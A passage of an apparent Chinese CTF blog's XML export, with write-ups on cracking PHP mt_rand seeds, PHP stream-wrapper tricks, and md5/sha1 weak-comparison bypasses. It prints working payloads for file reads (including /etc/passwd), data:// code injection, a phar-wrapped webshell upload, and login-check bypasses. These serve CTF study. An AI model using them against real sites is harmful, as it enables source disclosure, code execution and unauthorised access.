alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>伪随机数</title>
      <link href="/2019/12/03/wei-sui-ji-shu/"/>
      <url>/2019/12/03/wei-sui-ji-shu/</url>
      
        <content type="html"><![CDATA[<h4 id="在比赛中多次遇到了伪随机数的问题-总结一下"><a href="#在比赛中多次遇到了伪随机数的问题-总结一下" class="headerlink" title="在比赛中多次遇到了伪随机数的问题-总结一下"></a>在比赛中多次遇到了伪随机数的问题-总结一下</h4><p>在web安恒测试决赛的题目</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#这不是抽奖程序的源代码！不许看！</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: textml;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$str</span><span class="token punctuation">.</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;p id='p1'>"</span><span class="token punctuation">.</span><span class="token variable">$str_show</span><span class="token punctuation">.</span><span class="token string">"&lt;/p>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p id=flag>没抽中哦，再试试吧&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">"check.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>参考几篇博客<br><a href="http://wonderkun.cc/index.html/?p=585" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585</a><br><a href="https://www.anquanke.com/post/id/168308" target="_blank" rel="noopener">https://www.anquanke.com/post/id/168308</a><br>思路就很明显了</p><h3 id="Hack"><a href="#Hack" class="headerlink" title="Hack"></a>Hack</h3><h4 id="1、安装php-mt-seed"><a href="#1、安装php-mt-seed" class="headerlink" title="1、安装php_mt_seed"></a>1、安装php_mt_seed</h4><p><a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">https://www.openwall.com/php_mt_seed/</a>随便下载一个版本，放到linux下make就行了<br>使用的话直接</p><pre><code>root@kali:~/桌面/php_mt_seed-3.4# ./php_mt_seed 42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61 </code></pre><h4 id="2、整理本题数据"><a href="#2、整理本题数据" class="headerlink" title="2、整理本题数据"></a>2、整理本题数据</h4><p>我们先访问一下拿到前10位<br><img src="1.png" alt=""><br>从博客参考中我们能看到，还需要整理</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token string">"GMaBclSbBc"</span><span class="token punctuation">;</span><span class="token variable">$randStr</span> <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$randStr</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">echo</span> <span class="token variable">$pos</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token variable">$pos</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">.</span><span class="token string">"0 "</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$randStr</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">" "</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//整理成方便 php_mt_seed 测试的格式</span>  <span class="token comment" spellcheck="true">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>生成了</p><pre><code>42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61</code></pre><h4 id="3、使用php-mt-seed"><a href="#3、使用php-mt-seed" class="headerlink" title="3、使用php_mt_seed"></a>3、使用php_mt_seed</h4><pre><code>root@kali:~/桌面/php_mt_seed-3.4# ./php_mt_seed 42 42 0 61 48 48 0 61 0 0 0 61 37 37 0 61 2 2 0 61 11 11 0 61 54 54 0 61 1 1 0 61 37 37 0 61 2 2 0 61 Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Found 0, trying 536870912 - 570425343, speed 115704937 seeds per second seed = 552481257Found 1, trying 4261412864 - 4294967295, speed 109971944 seeds per second Found 1</code></pre><p>拿到种子552481257<br>一般而言是会返回你php版本号的，一定要使用特定的版本才能得到正确下一步</p><h4 id="4、还原数据"><a href="#4、还原数据" class="headerlink" title="4、还原数据"></a>4、还原数据</h4><pre><code>&lt;?phpmt_srand(552481257);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ ){    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       }echo $str;?&gt;</code></pre><p><code>输出GMaBclSbBcDfVku346h4</code><br><img src="2.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2019/12/03/php-wei-xie-yi/"/>
      <url>/2019/12/03/php-wei-xie-yi/</url>
      
        <content type="html"><![CDATA[<h3 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h3><pre><code>php:// — 访问各个输入/输出流（I/O streams）file:// — 访问本地文件系统phar:// — PHP 归档zlib:// — 压缩流data:// — 数据（RFC 2397）http:// — 访问 HTTP(s) 网址ftp:// — 访问 FTP(s) URLsglob:// — 查找匹配的文件路径模式ssh2:// — Secure Shell 2rar:// — RARogg:// — 音频流expect:// — 处理交互式的流</code></pre><p><img src="1.png" alt=""></p><h3 id="环境支持"><a href="#环境支持" class="headerlink" title="环境支持"></a>环境支持</h3><p>PHP.ini：</p><pre><code>allow_url_fopen ：on  默认开启  该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。allow_url_include：off  默认关闭，该选项为on便是允许 包含URL 对象文件等。</code></pre><h3 id="1-php-协议"><a href="#1-php-协议" class="headerlink" title="1.php://协议"></a>1.php://协议</h3><pre><code>php://filterphp://input</code></pre><p>php://filter：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，主要用于读取源代码并进行base64编码输出。<br>payload如下：</p><pre><code>php://filter/read=convert.base64-encode/resource=upload.php</code></pre><p>php://input：访问各个输入/输出流。CTF中经常使用file_get_contents获取php://input内容(POST)，需要开启allow_url_include，并且当enctype=”multipart/form-data”的时候 php://input是无效的。 </p><h3 id="2-file-协议"><a href="#2-file-协议" class="headerlink" title="2.file://协议"></a>2.file://协议</h3><p>file://：用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响，file://还经常和curl函数(SSRF)结合在一起。例子一，例子二<br>使用方法：</p><pre><code>file:// [文件的绝对路径和文件名]file:///etc/passwd</code></pre><h3 id="3-phar-协议"><a href="#3-phar-协议" class="headerlink" title="3.phar://协议"></a>3.phar://协议</h3><p>phar://：PHP 归档，常常跟文件包含，文件上传结合着考察。当文件上传仅仅校验mime类型与文件后缀，可以通过以下命令进行利用。例子一</p><pre><code>nac.php(木马)-&gt;压缩-&gt;nac.zip-&gt;改后缀-&gt;nac.jpg-&gt;上传-&gt;phar://nac.jpg/nac.php</code></pre><h3 id="4-zlib-协议"><a href="#4-zlib-协议" class="headerlink" title="4.zlib://协议"></a>4.zlib://协议</h3><pre><code>zip://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：file.php?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名]file.php?file=zip://nac.jpg#nac.php  其中get请求中#需要进行编码，即%23</code></pre><p>bzip2://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：</p><pre><code>file.php?file=compress.bzip2://nac.bz2file.php?file=compress.bzip2://./nac.jpgfile.php?file=compress.bzip2://D:/soft/phpStudy/WWW/file.jpg</code></pre><p>zlib://：在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用，使用如下：</p><pre><code>file.php?file=compress.zlib://file.gzfile.php?file=compress.zlib://./nac.jpgfile.php?file=compress.zlib://D:/soft/phpStudy/WWW/file.jpg</code></pre><h3 id="5-data-协议"><a href="#5-data-协议" class="headerlink" title="5.data://协议"></a>5.data://协议</h3><p>data://：需满足allow_url_fopen，allow_url_include同时开启才能使用，使用如下：</p><pre><code>file.php?file=data://text/plain,&lt;?php phpinfo()?&gt;file.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=file.php?file=data:text/plain,&lt;?php phpinfo()?&gt;file.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><h3 id="6-phar和zip"><a href="#6-phar和zip" class="headerlink" title="6.phar和zip"></a>6.phar和zip</h3><p><a href="https://kit4y.github.io/2020/01/04/phar-de-li-yong-zi-shi/">https://kit4y.github.io/2020/01/04/phar-de-li-yong-zi-shi/</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">https://www.freebuf.com/column/148886.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php中佛系的md5和数组</title>
      <link href="/2019/12/03/php-zhong-shen-mi-de-md5/"/>
      <url>/2019/12/03/php-zhong-shen-mi-de-md5/</url>
      
        <content type="html"><![CDATA[<h3 id="1、MD5函数漏洞"><a href="#1、MD5函数漏洞" class="headerlink" title="1、MD5函数漏洞"></a>1、MD5函数漏洞</h3><pre><code>$_GET[&#39;name&#39;] != $_GET[&#39;password&#39;]MD5($_GET[&#39;name&#39;]) == MD5($_GET[&#39;password&#39;])</code></pre><p>要求满足上述条件则<br>那么要求name和password数值不同但是MD5相同，在这里可以利用绕过。<br>PHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>以下值在md5加密后以0E开头：</p><pre><code>QNKCDZO240610708s878926199as155964671as214587387as214587387a</code></pre><p>以下值在sha1加密后以0E开头：</p><pre><code>sha1(&#39;aaroZmOk&#39;)sha1(&#39;aaK1STfY&#39;)sha1(&#39;aaO8zKZF&#39;)sha1(&#39;aa3OFF9m&#39;)</code></pre><p>GET传入a=QNKCDZO&amp;b=240610708就能绕过了</p><h3 id="2、php特性"><a href="#2、php特性" class="headerlink" title="2、php特性"></a>2、php特性</h3><pre><code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){        die(&quot;success!&quot;);    }</code></pre><p>在php中===为完全等于运算，不仅比较值，而且还比较值的类型，只有两者一致才为真。再次使用a=QNKCDZO&amp;b=240610708就不行了，因为a和b类型不同。<br>PHP中md5的函数特性</p><pre><code>md5([1,2,3]) == md5([4,5,6]) == NULL[1] !== [2] &amp;&amp; md5([1]) === md5([2])</code></pre><p>所以GET传入a[]=1&amp;b[]=2就能够绕过了。</p><h3 id="3、MD5碰撞"><a href="#3、MD5碰撞" class="headerlink" title="3、MD5碰撞"></a>3、MD5碰撞</h3><pre><code>if((string)$_POST[&#39;param1&#39;]!==(string)$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])){        die(&quot;success!);}</code></pre><p>要求构造param1和param2不同，但是MD5相同，也就是说要求传入两个MD5相同的不同字符串。<br>使用fastcoll_v1.0.0.5.exe工具碰撞</p><pre><code>Param1=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2Param2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>MD5值相同使用谷歌可以搜到相当多被巧妙构造出的二进制文件，其MD5相同，注意一点，post时一定要urlencode！！！建议使用burp编码</p><h3 id="4、实战"><a href="#4、实战" class="headerlink" title="4、实战"></a>4、实战</h3><h4 id="4-1、数组绕过md5和strcmp"><a href="#4-1、数组绕过md5和strcmp" class="headerlink" title="4.1、数组绕过md5和strcmp"></a>4.1、数组绕过md5和strcmp</h4><p>index.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v3</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v1</span> <span class="token operator">!=</span> <span class="token variable">$v2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>payload</p><pre><code>/index.php?v1[]=1&amp;v2[]=2&amp;v3[]=3</code></pre><h4 id="4-2、QNKCDZO碰撞"><a href="#4-2、QNKCDZO碰撞" class="headerlink" title="4.2、QNKCDZO碰撞"></a>4.2、QNKCDZO碰撞</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$md51</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'QNKCDZO'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$md52</span> <span class="token operator">=</span> @<span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">!=</span> <span class="token string">'QNKCDZO'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$md51</span> <span class="token operator">==</span> <span class="token variable">$md52</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"nctf{*****************}"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"false!!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token string">"please input a"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>要求输入两个md5值一样,但是字符串不一样的值,但是因为他比较使用的是==,所以可以通过md5值为0e开头的字符串绕过,因为php在处理==的时候当碰到的字符串有一边为0e开头的就把这串字符串认为是科学计数法,所以就是0,所以可以通过另一个md5值也是0e开头的字符串进行绕过.<br>payload</p><pre><code>?a=s878926199a</code></pre><pre><code>s878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a</code></pre><h4 id="4-3、还是数组绕过"><a href="#4-3、还是数组绕过" class="headerlink" title="4.3、还是数组绕过"></a>4.3、还是数组绕过</h4><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">'flag{xxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">'passwd can not be uname.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'uname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'margin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">print</span> <span class="token string">'sorry!'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span> </code></pre><p>payload</p><pre><code>/?uname[]=1&amp;id=margin&amp;passwd[]=2</code></pre><h4 id="4-4、弱类型整数大小比较绕过"><a href="#4-4、弱类型整数大小比较绕过" class="headerlink" title="4.4、弱类型整数大小比较绕过"></a>4.4、弱类型整数大小比较绕过</h4><pre class=" language-php"><code class="language-php"><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no numeric"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">NULL</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">1336</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></code></pre><p>payload<br><code>?password[]=1</code></p><h4 id="4-5、数组返回NULL绕过"><a href="#4-5、数组返回NULL绕过" class="headerlink" title="4.5、数组返回NULL绕过"></a>4.5、数组返回NULL绕过</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token string">'You password must be alphanumeric'</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'--'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span> <span class="token punctuation">.</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">echo</span> <span class="token string">'Invalid password'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>payload<br><code>?password[]=1</code></p><h4 id="4-6、strpos数组绕过"><a href="#4-6、strpos数组绕过" class="headerlink" title="4.6、strpos数组绕过"></a>4.6、strpos数组绕过</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token string">"flag"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">ereg</span> <span class="token punctuation">(</span><span class="token string">"^[1-9]+$"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token string">'必须输入数字才行'</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'#biubiubiu'</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Flag: '</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span 